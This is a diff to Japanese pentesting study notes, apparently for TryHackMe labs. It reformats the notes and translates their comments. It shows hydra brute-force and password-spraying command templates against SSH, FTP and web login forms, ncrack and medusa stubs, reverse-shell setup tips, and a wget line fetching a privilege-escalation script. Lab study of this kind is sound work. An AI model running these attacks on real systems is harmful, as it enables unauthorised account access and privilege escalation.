@@ -177,10 +177,10 @@ openvpn /etc/openvpn/[TryHackMeUserName].ovpn &
 
 * Windows Firewallの受信規則のうち、パブリックの「com.docker.backend」が有効だと、 +
 リバースシェルを張る時などのインバウンド通信が失敗してしまう。Linuxで構築する場合も同様。
-* 「--cap-add」を利用する代わりに「--privileged」でもopenvpnのエラー(errno=1)を回避できるが、 +
+* `--cap-add` を利用する代わりに `--privileged` でもopenvpnのエラー(errno=1)を回避できるが、 +
 プライベートDockerインスタンスが特権モードで実行されると、ホストプロセスへのアクセスやエスカレーションを許してしまうため非推奨。
-* Dockerインスタンスをstopし、再度`docker start <C-NAME>`した際に出る下記エラーは、 +
-管理者権限のPowerShellで当該コマンドを実行せずとも、`docker restart <C-NAME>`で回避できる。
+* Dockerインスタンスをstopし、再度 `docker start <C-NAME>` した際に出る下記エラーは、 +
+管理者権限のPowerShellで当該コマンドを実行せずとも、 `docker restart <C-NAME>` で回避できる。
 +
 ----
 An attempt was made to access a socket in a way forbidden by its access permissions.
@@ -545,19 +545,19 @@ Telnet, VMware Authentication Daemon (vmauthd), VNC, Generic Wrapper, Web Form
 
 ==== hydra
 
-* 効率的には、およそssh(2/s) < ftp(6/s) < http-basic(100/s)の速さ
-* パスワードスプレー攻撃も可能 +
+* 速度効率的には、おおよそ ssh(2/s) < ftp(6/s) < http-basic(100/s) となる
+* 下記を駆使することで、パスワードスプレー攻撃が可能 +
 -l：uid固定、-L：uidリスト、-p：pwd固定、-P：pwdリスト
-
++
 ----
 hydra -l [uname] \
       -P ~/pwd-list/[pwdtext] \
-      [TargetIP] \              # Protocol can be added
-      [TargetProtocol] \        # Can be omitted
-      -V \                      # Display UID, PWD during UID/PWD mining
-      -f \                      # Stop hydra when the specified PWD is found
-# Web form
-#     http-post-form \          # TargetProtocol
+      [TargetIP] \
+      [TargetProtocol] \        # 省略可能
+      -V \                      # UID/PWDのクラック中にそれぞれを表示
+      -f \                      # 指定のPWDが見つかったら止める
+# Web form に対するクラックの場合
+#     http-post-form \          # TargetProtocolの1つ
 # Example: "[Login Page]:[Request Body]:[Error Message]"
 #     "/path/to/login:uid=^USER^&pwd=^PASS^&Login=Login:Login Failed"
 ----
@@ -565,7 +565,7 @@ hydra -l [uname] \
 ==== ncrack
 
 * RDPサービスに関してはhydraより早いらしい
-
++
 ----
 ncrack -u [uname] \
        -P ~/pwd-list/[pwdtext] \
@@ -576,7 +576,7 @@ ncrack -u [uname] \
 ==== meduza
 
 * 一番遅い
-
++
 ----
 medusa -h [TargetIP] \
        -u [uname] \
@@ -681,7 +681,6 @@ wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-
 ==== https://github.com/sleventyeleven/linuxprivchecker[Linuxprivchecker]
 
 Python 2.6以降またはargparserがインストールされているシステムの場合、次のオプションを利用できるらしい。
-
 
 ----
 # 攻撃者側
